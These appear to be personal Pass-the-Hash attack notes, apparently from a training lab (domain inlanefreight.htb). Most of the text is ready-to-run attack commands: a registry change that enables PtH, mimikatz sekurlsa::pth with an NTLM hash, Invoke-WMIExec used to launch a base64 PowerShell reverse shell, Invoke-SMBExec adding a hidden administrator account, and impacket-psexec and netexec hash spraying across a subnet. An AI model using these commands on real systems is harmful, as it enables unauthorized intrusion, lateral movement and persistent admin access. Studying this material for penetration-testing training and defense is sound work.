PASS THE HASH
A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication.

HOW TO BYPASS RESTRICTIONS/ENABLE PTH ON WINDOWS:
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f


WINDOWS NTLM:
Microsoft's Windows New Technology LAN Manager (NTLM) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data


MIMIKATZ:
mimikatz.exe
sekurlsa::pth
You can use /rc4: or /NTLM: for the hash

(Use this command to open a cmd.exe as the user JULIO's privs [it won't show whoami])
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit


TO NAVIGATE SMB IN POWERSHELL/CMD:
look around using:
dir \\share\folder



INVOKE-THEHASH W/ SMB (INTO REVSHELL):
A collection of tools (similar to PowerHuntShell) that uses hash to gain privs

Import-Module .\Invoke-TheHash.psd1

(this was used to target a SHARE and sometimes it shows more folders when auth'd as specific users)
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e "

*NOTE: -Command "generated from revshells specifically for powershell #3 (Base64)

INVOKE-SMBEXEC FOR ACCESS TO SMB SHARES:
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose


IMPACKET PTH ATTACK VIA IMPACKET PSEXEC:
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

NETEXEC SMB PTH:
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
(if you want to attempt to auth into each host in a subnet using this hash, you can add --local-auth)
(you can use -x to execute commands like:)
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
(to a specific share:)
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --shares --sharenamee sharename
